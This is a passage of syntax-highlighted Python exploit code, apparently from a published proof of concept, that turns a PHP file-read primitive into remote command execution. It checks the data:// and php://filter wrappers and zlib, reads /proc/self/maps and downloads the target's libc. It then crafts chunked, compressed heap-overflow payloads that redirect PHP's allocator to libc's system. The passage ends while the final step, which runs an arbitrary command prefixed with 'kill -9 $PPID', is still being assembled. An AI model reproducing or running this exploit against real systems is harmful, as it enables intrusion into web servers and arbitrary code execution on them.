read primitive in PHP."""</span>    url<span class="token punctuation">:</span> <span class="token builtin">str</span>    command<span class="token punctuation">:</span> <span class="token builtin">str</span>    sleep<span class="token punctuation">:</span> <span class="token builtin">int</span> <span class="token operator">=</span> <span class="token number">1</span>    heap<span class="token punctuation">:</span> <span class="token builtin">str</span> <span class="token operator">=</span> <span class="token boolean">None</span>    pad<span class="token punctuation">:</span> <span class="token builtin">int</span> <span class="token operator">=</span> <span class="token number">20</span>    <span class="token keyword">def</span> <span class="token function">__post_init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>remote <span class="token operator">=</span> Remote<span class="token punctuation">(</span>self<span class="token punctuation">.</span>url<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>log <span class="token operator">=</span> logger<span class="token punctuation">(</span><span class="token string">"EXPLOIT"</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>info <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>        self<span class="token punctuation">.</span>heap <span class="token operator">=</span> self<span class="token punctuation">.</span>heap <span class="token keyword">and</span> <span class="token builtin">int</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>heap<span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">check_vulnerable</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token boolean">None</span><span class="token punctuation">:</span>        <span class="token keyword">def</span> <span class="token function">safe_download</span><span class="token punctuation">(</span>path<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">bytes</span><span class="token punctuation">:</span>            <span class="token keyword">try</span><span class="token punctuation">:</span>                <span class="token keyword">return</span> self<span class="token punctuation">.</span>remote<span class="token punctuation">.</span>download<span class="token punctuation">(</span>path<span class="token punctuation">)</span>            <span class="token keyword">except</span> ConnectionError<span class="token punctuation">:</span>                failure<span class="token punctuation">(</span><span class="token string">"Target not [b]reachable[/] ?"</span><span class="token punctuation">)</span>                    <span class="token keyword">def</span> <span class="token function">check_token</span><span class="token punctuation">(</span>text<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">,</span> path<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">bool</span><span class="token punctuation">:</span>            result <span class="token operator">=</span> safe_download<span class="token punctuation">(</span>path<span class="token punctuation">)</span>            <span class="token keyword">return</span> text<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> result        text <span class="token operator">=</span> tf<span class="token punctuation">.</span>random<span class="token punctuation">.</span>string<span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span>        base64 <span class="token operator">=</span> b64<span class="token punctuation">(</span>text<span class="token punctuation">,</span> misalign<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>        path <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"data:text/plain;base64,</span><span class="token interpolation"><span class="token punctuation">&#123;</span>base64<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>                result <span class="token operator">=</span> safe_download<span class="token punctuation">(</span>path<span class="token punctuation">)</span>                <span class="token keyword">if</span> text <span class="token keyword">not</span> <span class="token keyword">in</span> result<span class="token punctuation">:</span>            msg_failure<span class="token punctuation">(</span><span class="token string">"Remote.download did not return the test string"</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"--------------------"</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Expected test string: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>text<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Got: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>result<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"--------------------"</span><span class="token punctuation">)</span>            failure<span class="token punctuation">(</span><span class="token string">"If your code works fine, it means that the [i]data://[/] wrapper does not work"</span><span class="token punctuation">)</span>        msg_info<span class="token punctuation">(</span><span class="token string">"The [i]data://[/] wrapper works"</span><span class="token punctuation">)</span>        text <span class="token operator">=</span> tf<span class="token punctuation">.</span>random<span class="token punctuation">.</span>string<span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span>        base64 <span class="token operator">=</span> b64<span class="token punctuation">(</span>text<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> misalign<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>        path <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"php://filter//resource=data:text/plain;base64,</span><span class="token interpolation"><span class="token punctuation">&#123;</span>base64<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>        <span class="token keyword">if</span> <span class="token keyword">not</span> check_token<span class="token punctuation">(</span>text<span class="token punctuation">,</span> path<span class="token punctuation">)</span><span class="token punctuation">:</span>            failure<span class="token punctuation">(</span><span class="token string">"The [i]php://filter/[/] wrapper does not work"</span><span class="token punctuation">)</span>        msg_info<span class="token punctuation">(</span><span class="token string">"The [i]php://filter/[/] wrapper works"</span><span class="token punctuation">)</span>        text <span class="token operator">=</span> tf<span class="token punctuation">.</span>random<span class="token punctuation">.</span>string<span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span>        base64 <span class="token operator">=</span> b64<span class="token punctuation">(</span>compress<span class="token punctuation">(</span>text<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> misalign<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>        path <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"php://filter/zlib.inflate/resource=data:text/plain;base64,</span><span class="token interpolation"><span class="token punctuation">&#123;</span>base64<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>        <span class="token keyword">if</span> <span class="token keyword">not</span> check_token<span class="token punctuation">(</span>text<span class="token punctuation">,</span> path<span class="token punctuation">)</span><span class="token punctuation">:</span>            failure<span class="token punctuation">(</span><span class="token string">"The [i]zlib[/] extension is not enabled"</span><span class="token punctuation">)</span>        msg_info<span class="token punctuation">(</span><span class="token string">"The [i]zlib[/] extension is enabled"</span><span class="token punctuation">)</span>        msg_success<span class="token punctuation">(</span><span class="token string">"Exploit preconditions are satisfied"</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">get_file</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> path<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">bytes</span><span class="token punctuation">:</span>        <span class="token keyword">with</span> msg_status<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Downloading [i]</span><span class="token interpolation"><span class="token punctuation">&#123;</span>path<span class="token punctuation">&#125;</span></span><span class="token string">[/]..."</span></span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> self<span class="token punctuation">.</span>remote<span class="token punctuation">.</span>download<span class="token punctuation">(</span>path<span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">get_regions</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">list</span><span class="token punctuation">[</span>Region<span class="token punctuation">]</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""Obtains the memory regions of the PHP process by querying /proc/self/maps."""</span>        maps <span class="token operator">=</span> self<span class="token punctuation">.</span>get_file<span class="token punctuation">(</span><span class="token string">"/proc/self/maps"</span><span class="token punctuation">)</span>        maps <span class="token operator">=</span> maps<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>        PATTERN <span class="token operator">=</span> re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span>            <span class="token string">r"^([a-f0-9]+)-([a-f0-9]+)\b"</span> <span class="token string">r".*"</span> <span class="token string">r"\s([-rwx]&#123;3&#125;[ps])\s"</span> <span class="token string">r"(.*)"</span>        <span class="token punctuation">)</span>        regions <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>        <span class="token keyword">for</span> region <span class="token keyword">in</span> table<span class="token punctuation">.</span>split<span class="token punctuation">(</span>maps<span class="token punctuation">,</span> strip<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> <span class="token keyword">match</span> <span class="token operator">:=</span> PATTERN<span class="token punctuation">.</span><span class="token keyword">match</span><span class="token punctuation">(</span>region<span class="token punctuation">)</span><span class="token punctuation">:</span>                start <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token keyword">match</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>                stop <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token keyword">match</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>                permissions <span class="token operator">=</span> <span class="token keyword">match</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>                path <span class="token operator">=</span> <span class="token keyword">match</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>                <span class="token keyword">if</span> <span class="token string">"/"</span> <span class="token keyword">in</span> path <span class="token keyword">or</span> <span class="token string">"["</span> <span class="token keyword">in</span> path<span class="token punctuation">:</span>                    path <span class="token operator">=</span> path<span class="token punctuation">.</span>rsplit<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>                <span class="token keyword">else</span><span class="token punctuation">:</span>                    path <span class="token operator">=</span> <span class="token string">""</span>                current <span class="token operator">=</span> Region<span class="token punctuation">(</span>start<span class="token punctuation">,</span> stop<span class="token punctuation">,</span> permissions<span class="token punctuation">,</span> path<span class="token punctuation">)</span>                regions<span class="token punctuation">.</span>append<span class="token punctuation">(</span>current<span class="token punctuation">)</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span>maps<span class="token punctuation">)</span>                failure<span class="token punctuation">(</span><span class="token string">"Unable to parse memory mappings"</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Got </span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">len</span><span class="token punctuation">(</span>regions<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string"> memory regions"</span></span><span class="token punctuation">)</span>        <span class="token keyword">return</span> regions    <span class="token keyword">def</span> <span class="token function">get_symbols_and_addresses</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token boolean">None</span><span class="token punctuation">:</span>        regions <span class="token operator">=</span> self<span class="token punctuation">.</span>get_regions<span class="token punctuation">(</span><span class="token punctuation">)</span>        LIBC_FILE <span class="token operator">=</span> <span class="token string">"/dev/shm/cnext-libc"</span>        <span class="token comment"># PHP's heap</span>        self<span class="token punctuation">.</span>info<span class="token punctuation">[</span><span class="token string">"heap"</span><span class="token punctuation">]</span> <span class="token operator">=</span> self<span class="token punctuation">.</span>heap <span class="token keyword">or</span> self<span class="token punctuation">.</span>find_main_heap<span class="token punctuation">(</span>regions<span class="token punctuation">)</span>        <span class="token comment"># Libc</span>        libc <span class="token operator">=</span> self<span class="token punctuation">.</span>_get_region<span class="token punctuation">(</span>regions<span class="token punctuation">,</span> <span class="token string">"libc-"</span><span class="token punctuation">,</span> <span class="token string">"libc.so"</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>download_file<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>path<span class="token punctuation">,</span> LIBC_FILE<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>info<span class="token punctuation">[</span><span class="token string">"libc"</span><span class="token punctuation">]</span> <span class="token operator">=</span> ELF<span class="token punctuation">(</span>LIBC_FILE<span class="token punctuation">,</span> checksec<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>info<span class="token punctuation">[</span><span class="token string">"libc"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>address <span class="token operator">=</span> libc<span class="token punctuation">.</span>start    <span class="token keyword">def</span> <span class="token function">_get_region</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> regions<span class="token punctuation">:</span> <span class="token builtin">list</span><span class="token punctuation">[</span>Region<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token operator">*</span>names<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> Region<span class="token punctuation">:</span>        <span class="token keyword">for</span> region <span class="token keyword">in</span> regions<span class="token punctuation">:</span>            <span class="token keyword">if</span> <span class="token builtin">any</span><span class="token punctuation">(</span>name <span class="token keyword">in</span> region<span class="token punctuation">.</span>path <span class="token keyword">for</span> name <span class="token keyword">in</span> names<span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">break</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            failure<span class="token punctuation">(</span><span class="token string">"Unable to locate region"</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> region    <span class="token keyword">def</span> <span class="token function">download_file</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> remote_path<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">,</span> local_path<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token boolean">None</span><span class="token punctuation">:</span>        data <span class="token operator">=</span> self<span class="token punctuation">.</span>get_file<span class="token punctuation">(</span>remote_path<span class="token punctuation">)</span>        Path<span class="token punctuation">(</span>local_path<span class="token punctuation">)</span><span class="token punctuation">.</span>write<span class="token punctuation">(</span>data<span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">find_main_heap</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> regions<span class="token punctuation">:</span> <span class="token builtin">list</span><span class="token punctuation">[</span>Region<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> Region<span class="token punctuation">:</span>        heaps <span class="token operator">=</span> <span class="token punctuation">[</span>            region<span class="token punctuation">.</span>stop <span class="token operator">-</span> HEAP_SIZE <span class="token operator">+</span> <span class="token number">0x40</span>            <span class="token keyword">for</span> region <span class="token keyword">in</span> <span class="token builtin">reversed</span><span class="token punctuation">(</span>regions<span class="token punctuation">)</span>            <span class="token keyword">if</span> region<span class="token punctuation">.</span>permissions <span class="token operator">==</span> <span class="token string">"rw-p"</span>            <span class="token keyword">and</span> region<span class="token punctuation">.</span>size <span class="token operator">>=</span> HEAP_SIZE            <span class="token keyword">and</span> region<span class="token punctuation">.</span>stop <span class="token operator">&amp;</span> <span class="token punctuation">(</span>HEAP_SIZE<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span>            <span class="token keyword">and</span> region<span class="token punctuation">.</span>path <span class="token operator">==</span> <span class="token string">""</span>        <span class="token punctuation">]</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> heaps<span class="token punctuation">:</span>            failure<span class="token punctuation">(</span><span class="token string">"Unable to find PHP's main heap in memory"</span><span class="token punctuation">)</span>        first <span class="token operator">=</span> heaps<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>        <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>heaps<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">1</span><span class="token punctuation">:</span>            heaps <span class="token operator">=</span> <span class="token string">", "</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token builtin">map</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">,</span> heaps<span class="token punctuation">)</span><span class="token punctuation">)</span>            msg_info<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Potential heaps: [i]</span><span class="token interpolation"><span class="token punctuation">&#123;</span>heaps<span class="token punctuation">&#125;</span></span><span class="token string">[/] (using first)"</span></span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            msg_info<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Using [i]</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">hex</span><span class="token punctuation">(</span>first<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">[/] as heap"</span></span><span class="token punctuation">)</span>        <span class="token keyword">return</span> first    <span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token boolean">None</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>check_vulnerable<span class="token punctuation">(</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>get_symbols_and_addresses<span class="token punctuation">(</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>exploit<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">build_exploit_path</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">str</span><span class="token punctuation">:</span>        LIBC <span class="token operator">=</span> self<span class="token punctuation">.</span>info<span class="token punctuation">[</span><span class="token string">"libc"</span><span class="token punctuation">]</span>        ADDR_EMALLOC <span class="token operator">=</span> LIBC<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"__libc_malloc"</span><span class="token punctuation">]</span>        ADDR_EFREE <span class="token operator">=</span> LIBC<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"__libc_system"</span><span class="token punctuation">]</span>        ADDR_EREALLOC <span class="token operator">=</span> LIBC<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"__libc_realloc"</span><span class="token punctuation">]</span>        ADDR_HEAP <span class="token operator">=</span> self<span class="token punctuation">.</span>info<span class="token punctuation">[</span><span class="token string">"heap"</span><span class="token punctuation">]</span>        ADDR_FREE_SLOT <span class="token operator">=</span> ADDR_HEAP <span class="token operator">+</span> <span class="token number">0x20</span>        ADDR_CUSTOM_HEAP <span class="token operator">=</span> ADDR_HEAP <span class="token operator">+</span> <span class="token number">0x0168</span>        ADDR_FAKE_BIN <span class="token operator">=</span> ADDR_FREE_SLOT <span class="token operator">-</span> <span class="token number">0x10</span>        CS <span class="token operator">=</span> <span class="token number">0x100</span>        <span class="token comment"># Pad needs to stay at size 0x100 at every step</span>        pad_size <span class="token operator">=</span> CS <span class="token operator">-</span> <span class="token number">0x18</span>        pad <span class="token operator">=</span> <span class="token string">b"\x00"</span> <span class="token operator">*</span> pad_size        pad <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>pad<span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>pad<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">6</span><span class="token punctuation">)</span>        pad <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>pad<span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>pad<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">6</span><span class="token punctuation">)</span>        pad <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>pad<span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>pad<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">6</span><span class="token punctuation">)</span>        pad <span class="token operator">=</span> compressed_bucket<span class="token punctuation">(</span>pad<span class="token punctuation">)</span>        step1_size <span class="token operator">=</span> <span class="token number">1</span>        step1 <span class="token operator">=</span> <span class="token string">b"\x00"</span> <span class="token operator">*</span> step1_size        step1 <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step1<span class="token punctuation">)</span>        step1 <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step1<span class="token punctuation">)</span>        step1 <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step1<span class="token punctuation">,</span> CS<span class="token punctuation">)</span>        step1 <span class="token operator">=</span> compressed_bucket<span class="token punctuation">(</span>step1<span class="token punctuation">)</span>        step2_size <span class="token operator">=</span> <span class="token number">0x48</span>        step2 <span class="token operator">=</span> <span class="token string">b"\x00"</span> <span class="token operator">*</span> <span class="token punctuation">(</span>step2_size <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span>        step2 <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step2<span class="token punctuation">,</span> CS<span class="token punctuation">)</span>        step2 <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step2<span class="token punctuation">)</span>        step2 <span class="token operator">=</span> compressed_bucket<span class="token punctuation">(</span>step2<span class="token punctuation">)</span>        step2_write_ptr <span class="token operator">=</span> <span class="token string">b"0\n"</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span>step2_size<span class="token punctuation">,</span> <span class="token string">b"\x00"</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>ADDR_FAKE_BIN<span class="token punctuation">)</span>        step2_write_ptr <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step2_write_ptr<span class="token punctuation">,</span> CS<span class="token punctuation">)</span>        step2_write_ptr <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step2_write_ptr<span class="token punctuation">)</span>        step2_write_ptr <span class="token operator">=</span> compressed_bucket<span class="token punctuation">(</span>step2_write_ptr<span class="token punctuation">)</span>        step3_size <span class="token operator">=</span> CS        step3 <span class="token operator">=</span> <span class="token string">b"\x00"</span> <span class="token operator">*</span> step3_size        <span class="token keyword">assert</span> <span class="token builtin">len</span><span class="token punctuation">(</span>step3<span class="token punctuation">)</span> <span class="token operator">==</span> CS        step3 <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step3<span class="token punctuation">)</span>        step3 <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step3<span class="token punctuation">)</span>        step3 <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step3<span class="token punctuation">)</span>        step3 <span class="token operator">=</span> compressed_bucket<span class="token punctuation">(</span>step3<span class="token punctuation">)</span>        step3_overflow <span class="token operator">=</span> <span class="token string">b"\x00"</span> <span class="token operator">*</span> <span class="token punctuation">(</span>step3_size <span class="token operator">-</span> <span class="token builtin">len</span><span class="token punctuation">(</span>BUG<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> BUG        <span class="token keyword">assert</span> <span class="token builtin">len</span><span class="token punctuation">(</span>step3_overflow<span class="token punctuation">)</span> <span class="token operator">==</span> CS        step3_overflow <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step3_overflow<span class="token punctuation">)</span>        step3_overflow <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step3_overflow<span class="token punctuation">)</span>        step3_overflow <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step3_overflow<span class="token punctuation">)</span>        step3_overflow <span class="token operator">=</span> compressed_bucket<span class="token punctuation">(</span>step3_overflow<span class="token punctuation">)</span>        step4_size <span class="token operator">=</span> CS        step4 <span class="token operator">=</span> <span class="token string">b"=00"</span> <span class="token operator">+</span> <span class="token string">b"\x00"</span> <span class="token operator">*</span> <span class="token punctuation">(</span>step4_size <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>        step4 <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step4<span class="token punctuation">)</span>        step4 <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step4<span class="token punctuation">)</span>        step4 <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step4<span class="token punctuation">)</span>        step4 <span class="token operator">=</span> compressed_bucket<span class="token punctuation">(</span>step4<span class="token punctuation">)</span>        step4_pwn <span class="token operator">=</span> ptr_bucket<span class="token punctuation">(</span>            <span class="token number">0x200000</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token comment"># free_slot</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            ADDR_CUSTOM_HEAP<span class="token punctuation">,</span>  <span class="token comment"># 0x18</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            ADDR_HEAP<span class="token punctuation">,</span>  <span class="token comment"># 0x140</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            size<span class="token operator">=</span>CS<span class="token punctuation">,</span>        <span class="token punctuation">)</span>        step4_custom_heap <span class="token operator">=</span> ptr_bucket<span class="token punctuation">(</span>            ADDR_EMALLOC<span class="token punctuation">,</span> ADDR_EFREE<span class="token punctuation">,</span> ADDR_EREALLOC<span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token number">0x18</span>        <span class="token punctuation">)</span>        step4_use_custom_heap_size <span class="token operator">=</span> <span class="token number">0x140</span>        COMMAND <span class="token operator">=</span> self<span class="token punctuation">.</span>command        COMMAND <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"kill -9 $PPID; </span><span class="token interpolation"><span class="token punctuation">&#123;</span>COMMAND<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>        <span class="token keyword">if</span> self<span class="token punctuation">.</span>sleep<span class="token punctuation">:</span>            COMMAND <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"sleep </span><span class="token interpolation"><span class="token punctuation">&#123;</span>self<span class="token punctuation">.</span>sleep<span class="token punctuation">&#125;</span></span><span class="token string">; </span><span class="token interpolation"><span class="token punctuation">&#123;</span>COMMAND<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>        COMMAND <span class="token operator">=</span> COMMAND<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b"\x00"</span>        <span class="token keyword">assert</span> <span class="token punctuation">(</span>            <span class="token builtin">len</span><span class="token punctuation">(</span>COMMAND<span class="token punctuation">)</span> <span class="token operator">&lt;=</span> step4_use_custom_heap_size        <span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string-interpolation"><span class="token string">f"Command too big (</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">len</span><span class="token punctuation">(</span>COMMAND<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">), it must be strictly inferior to </span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">hex</span><span class="token punctuation">(</span>step4_use_custom_heap_size<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>        COMMAND <span class="token operator">=</span> COMMAND<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span>step4_use_custom_heap_size<span class="token punctuation">,</span> <span class="token string">b"\x00"</span><span class="token punctuation">)</span>        step4_use_custom_heap <span class="token operator">=</span> COMMAND        step4_use_custom_heap <span class="token operator">=</span> qpe<span class="token punctuation">(</span>step4_use_custom_heap<span class="token punctuation">)</span>        step4_use_custom_heap <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step4_use_custom_heap<span class="token punctuation">)</span>        step4_use_custom_heap <span class="token operator">=</span> 